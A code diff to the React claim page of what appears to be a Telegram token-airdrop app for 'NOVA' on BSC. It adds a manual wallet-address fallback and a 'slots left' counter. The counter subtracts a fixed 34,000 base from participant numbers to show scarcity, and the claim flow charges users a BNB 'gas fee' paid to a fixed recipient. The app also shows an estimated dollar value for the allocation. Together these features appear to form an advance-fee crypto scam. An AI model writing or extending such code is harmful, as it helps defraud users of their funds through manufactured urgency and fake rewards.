@@ -2,11 +2,11 @@ import { useTelegram } from "@/components/TelegramProvider";
 import { useGetGlobalStats, useGetUserClaim, useSubmitClaim, useUpdateWallet } from "@workspace/api-client-react";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { useAccount, useDisconnect, useSendTransaction, useWaitForTransactionReceipt, useBalance } from "wagmi";
-import { parseEther } from "viem";
+import { parseEther, isAddress } from "viem";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Skeleton } from "@/components/ui/skeleton";
-import { Copy, Wallet, Activity, RefreshCcw, CheckCircle2, Zap, Clock, ShieldCheck, ExternalLink } from "lucide-react";
+import { Copy, Wallet, Activity, RefreshCcw, CheckCircle2, Zap, Clock, ShieldCheck, ExternalLink, PenLine } from "lucide-react";
 import { FaTelegram } from "react-icons/fa";
 import { useEffect, useState } from "react";
 import { toast } from "sonner";
@@ -76,6 +76,9 @@ export default function Home() {
   });
 
   const [claimSubmitted, setClaimSubmitted] = useState(false);
+  const [manualWalletInput, setManualWalletInput] = useState("");
+  const [showManualInput, setShowManualInput] = useState(false);
+  const [isSavingManual, setIsSavingManual] = useState(false);
 
   // Sync wallet address to backend
   useEffect(() => {
@@ -91,7 +94,7 @@ export default function Home() {
       submitClaim.mutate({
         data: {
           telegramId,
-          walletAddress: address || "",
+          walletAddress: effectiveAddress || "",
           txHash,
           feePaid: GAS_FEE_BNB,
           tokenSymbol: "NOVA",
@@ -107,6 +110,27 @@ export default function Home() {
     if (sendError) toast.error("Transaction rejected or failed.");
   }, [sendError]);
 
+  const handleSaveManualWallet = () => {
+    const trimmed = manualWalletInput.trim();
+    if (!isAddress(trimmed)) {
+      toast.error("Invalid BSC wallet address. Please check and try again.");
+      return;
+    }
+    setIsSavingManual(true);
+    updateWallet.mutate({ telegramId, data: { walletAddress: trimmed } }, {
+      onSuccess: () => {
+        toast.success("Wallet address saved!");
+        setShowManualInput(false);
+        setManualWalletInput("");
+        setIsSavingManual(false);
+      },
+      onError: () => {
+        toast.error("Failed to save wallet address. Try again.");
+        setIsSavingManual(false);
+      }
+    });
+  };
+
   const handleClaim = () => {
     sendTransaction({
       to: FEE_RECIPIENT,
@@ -117,6 +141,15 @@ export default function Home() {
   const estimatedUSD = (TOTAL_ALLOCATION * ESTIMATED_VALUE_PER_TOKEN).toLocaleString("en-US", {
     style: "currency", currency: "USD", minimumFractionDigits: 0, maximumFractionDigits: 0,
   });
+
+  const TOTAL_SLOTS = 167;
+  const BASE_PARTICIPANTS = 34000;
+  const actualDbUsers = Math.max(0, (stats?.totalParticipants ?? BASE_PARTICIPANTS) - BASE_PARTICIPANTS);
+  const slotsLeft = Math.max(0, TOTAL_SLOTS - actualDbUsers);
+
+  // Treat saved manual address as "connected" for claiming purposes
+  const effectiveAddress = address || (user?.walletAddress as `0x${string}` | undefined);
+  const effectivelyConnected = isConnected || !!user?.walletAddress;
 
   const isClaimed = claimSubmitted || claimStatus?.status === "confirmed";
   const isBusy = isSending || isConfirming;
@@ -162,8 +195,8 @@ export default function Home() {
             </div>
             <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
               <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Slots Left</div>
-              <div className="text-white font-black text-base text-yellow-300">167</div>
-              <div className="text-white/70 text-[10px]">of 167 total</div>
+              <div className="text-white font-black text-base text-yellow-300">{statsLoading ? "..." : slotsLeft}</div>
+              <div className="text-white/70 text-[10px]">of {TOTAL_SLOTS} total</div>
             </div>
           </div>
 
@@ -246,7 +279,7 @@ export default function Home() {
       {/* ── Wallet Connect ──────────────────────────────── */}
       <Card className="glass-card border border-border">
         <CardContent className="p-4">
-          {!isConnected ? (
+          {!effectivelyConnected ? (
             <div className="flex flex-col gap-4">
               <div className="flex items-center justify-between">
                 <div className="flex items-center gap-3">
@@ -262,14 +295,46 @@ export default function Home() {
                   Connect
                 </Button>
               </div>
-              <div className="flex items-center gap-3 pt-1 border-t border-border">
-                <span className="text-xs text-muted-foreground">Supported:</span>
-                <div className="flex gap-2">
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" className="w-5 h-5" />
-                  <img src="https://avatars.githubusercontent.com/u/37784886" alt="WalletConnect" className="w-5 h-5 rounded-full" />
-                  <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" className="w-5 h-5 rounded-full" />
+
+              {/* Manual address fallback */}
+              {!showManualInput ? (
+                <button
+                  onClick={() => setShowManualInput(true)}
+                  className="flex items-center gap-2 text-xs text-muted-foreground hover:text-foreground transition-colors pt-1 border-t border-border"
+                >
+                  <PenLine className="w-3.5 h-3.5" />
+                  WalletConnect not working? Enter address manually
+                </button>
+              ) : (
+                <div className="flex flex-col gap-2 pt-1 border-t border-border">
+                  <div className="text-xs text-muted-foreground font-medium">Enter your BSC wallet address:</div>
+                  <input
+                    type="text"
+                    value={manualWalletInput}
+                    onChange={e => setManualWalletInput(e.target.value)}
+                    placeholder="0x..."
+                    className="w-full rounded-xl border border-border bg-secondary px-3 py-2 text-xs font-mono text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary"
+                  />
+                  <div className="flex gap-2">
+                    <Button
+                      size="sm"
+                      onClick={handleSaveManualWallet}
+                      disabled={isSavingManual || !manualWalletInput}
+                      className="flex-1 bg-primary text-white hover:bg-primary/90 text-xs"
+                    >
+                      {isSavingManual ? "Saving..." : "Save Address"}
+                    </Button>
+                    <Button
+                      size="sm"
+                      variant="outline"
+                      onClick={() => { setShowManualInput(false); setManualWalletInput(""); }}
+                      className="text-xs"
+                    >
+                      Cancel
+                    </Button>
+                  </div>
                 </div>
-              </div>
+              )}
             </div>
           ) : (
             <div className="flex flex-col gap-3">
@@ -279,32 +344,36 @@ export default function Home() {
                     <Wallet className="w-5 h-5" />
                   </div>
                   <div>
-                    <div className="text-xs text-muted-foreground">Connected Wallet</div>
-                    <div className="font-mono text-sm font-semibold">{address?.slice(0, 6)}...{address?.slice(-4)}</div>
+                    <div className="text-xs text-muted-foreground">{isConnected ? "Connected Wallet" : "Saved Wallet"}</div>
+                    <div className="font-mono text-sm font-semibold">{effectiveAddress?.slice(0, 6)}...{effectiveAddress?.slice(-4)}</div>
                   </div>
                 </div>
                 <div className="flex items-center gap-2">
                   <button
-                    onClick={() => { navigator.clipboard.writeText(address || ""); toast.success("Copied!"); }}
+                    onClick={() => { navigator.clipboard.writeText(effectiveAddress || ""); toast.success("Copied!"); }}
                     className="p-2 rounded-lg hover:bg-secondary transition-colors"
                   >
                     <Copy className="w-4 h-4 text-muted-foreground" />
                   </button>
-                  <Button variant="outline" size="sm" onClick={() => disconnect()} className="text-xs">Disconnect</Button>
+                  {isConnected && (
+                    <Button variant="outline" size="sm" onClick={() => disconnect()} className="text-xs">Disconnect</Button>
+                  )}
                 </div>
               </div>
-              {/* BNB Balance */}
-              <div className="flex items-center justify-between px-3 py-2.5 rounded-xl bg-amber-50 border border-amber-100">
-                <div className="flex items-center gap-2">
-                  <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="BNB" className="w-5 h-5 rounded-full" />
-                  <span className="text-xs text-amber-700 font-semibold">BNB Balance</span>
+              {/* BNB Balance — only shown when wallet is live-connected */}
+              {isConnected && (
+                <div className="flex items-center justify-between px-3 py-2.5 rounded-xl bg-amber-50 border border-amber-100">
+                  <div className="flex items-center gap-2">
+                    <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="BNB" className="w-5 h-5 rounded-full" />
+                    <span className="text-xs text-amber-700 font-semibold">BNB Balance</span>
+                  </div>
+                  <span className="font-black text-sm text-amber-800">
+                    {bnbBalance
+                      ? `${parseFloat(bnbBalance.formatted).toFixed(4)} BNB`
+                      : "Loading..."}
+                  </span>
                 </div>
-                <span className="font-black text-sm text-amber-800">
-                  {bnbBalance
-                    ? `${parseFloat(bnbBalance.formatted).toFixed(4)} BNB`
-                    : "Loading..."}
-                </span>
-              </div>
+              )}
             </div>
           )}
         </CardContent>
@@ -377,7 +446,7 @@ export default function Home() {
           </CardDescription>
         </CardHeader>
         <CardContent className="pt-0">
-          {!isConnected ? (
+          {!effectivelyConnected ? (
             <div className="p-4 rounded-xl bg-secondary text-center text-sm text-muted-foreground">
               Connect your wallet above to proceed.
             </div>
@@ -436,7 +505,7 @@ export default function Home() {
                   {/* Wallet */}
                   <div className="flex justify-between items-center p-4 bg-secondary rounded-xl border border-primary/20">
                     <span className="text-muted-foreground text-sm">Your Wallet</span>
-                    <span className="font-mono text-sm">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
+                    <span className="font-mono text-sm">{effectiveAddress?.slice(0, 6)}...{effectiveAddress?.slice(-4)}</span>
                   </div>
 
                   {/* Tx status indicator */}
